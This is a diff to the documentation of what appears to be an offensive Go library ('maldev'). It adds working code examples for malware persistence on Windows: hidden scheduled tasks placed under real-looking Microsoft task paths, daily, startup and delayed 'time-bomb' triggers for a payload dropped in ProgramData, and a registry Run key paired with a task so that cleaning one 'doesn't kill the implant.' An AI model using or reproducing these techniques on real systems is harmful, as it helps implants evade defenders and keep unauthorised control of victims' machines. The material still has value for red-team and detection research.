@@ -9,7 +9,7 @@
 
 ---
 
-## For Beginners
+## Primer
 
 Windows Task Scheduler can run programs on triggers like logon, system startup, or daily schedules. Creating a scheduled task ensures the payload runs even if the user cleans the Startup folder or registry Run keys.
 
@@ -55,6 +55,98 @@ found, _ := scheduler.Exists(`\Microsoft\Windows\Update\Check`)
 
 err = scheduler.Delete(`\Microsoft\Windows\Update\Check`)
 ```
+
+---
+
+## Advanced — Daily Trigger + Timed One-Shot
+
+`WithTriggerDaily` fires every N days at a configurable offset; combine it
+with `WithTriggerTime` for a one-shot future execution (useful for a
+time-bomb). `List()` and `Run()` round out the management surface.
+
+```go
+import (
+    "log"
+    "time"
+
+    "github.com/oioio-space/maldev/persistence/scheduler"
+)
+
+// Daily at 08:30 — disguised as a Windows Update check.
+err := scheduler.Create(`\Microsoft\Windows\Update\Check`,
+    scheduler.WithAction(`C:\ProgramData\Intel\agent.exe`, "--silent"),
+    scheduler.WithTriggerDaily(1),
+    scheduler.WithHidden(),
+)
+if err != nil {
+    log.Fatal(err)
+}
+
+// One-shot: fire in 24 hours (time-bomb / delayed payload).
+err = scheduler.Create(`\Microsoft\Windows\Update\Once`,
+    scheduler.WithAction(`C:\ProgramData\Intel\agent.exe`, "--once"),
+    scheduler.WithTriggerTime(time.Now().Add(24*time.Hour)),
+    scheduler.WithHidden(),
+)
+
+// Enumerate all tasks — useful for cleanup before exfil.
+tasks, _ := scheduler.List()
+for _, t := range tasks {
+    log.Printf("%-60s  %s", t.Name, t.Path)
+}
+```
+
+---
+
+## Combined Example — Task + Registry Dual-Persistence
+
+Register two independent persistence mechanisms so removing one doesn't
+kill the implant.
+
+```go
+package main
+
+import (
+    "log"
+
+    "github.com/oioio-space/maldev/persistence/registry"
+    "github.com/oioio-space/maldev/persistence/scheduler"
+)
+
+const (
+    payload  = `C:\ProgramData\Microsoft\Windows\Caches\mscache.exe`
+    taskName = `\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector`
+)
+
+func main() {
+    // 1. Registry Run key — fires on user logon without elevation.
+    if err := registry.Set(
+        registry.HiveCurrentUser, registry.KeyRun,
+        "DiskDiagnostic", payload,
+    ); err != nil {
+        log.Printf("registry: %v", err)
+    }
+
+    // 2. Scheduled task hidden under a real Windows task path — fires at
+    //    system startup (requires admin) so it covers sessions before
+    //    user logon.
+    if err := scheduler.Create(taskName,
+        scheduler.WithAction(payload, ""),
+        scheduler.WithTriggerStartup(),
+        scheduler.WithHidden(),
+    ); err != nil {
+        log.Printf("scheduler: %v", err)
+    }
+
+    // Both mechanisms point at the same payload; cleaning one still leaves
+    // the other. The task name mimics a legitimate Windows diagnostic task.
+}
+```
+
+Layered benefit: registry persistence covers normal user sessions; the
+scheduled task covers SYSTEM-context startup and is hidden in a task path
+that resembles a built-in Windows component — two independent kill-switches
+the analyst must find and remove separately.
 
 ---
 
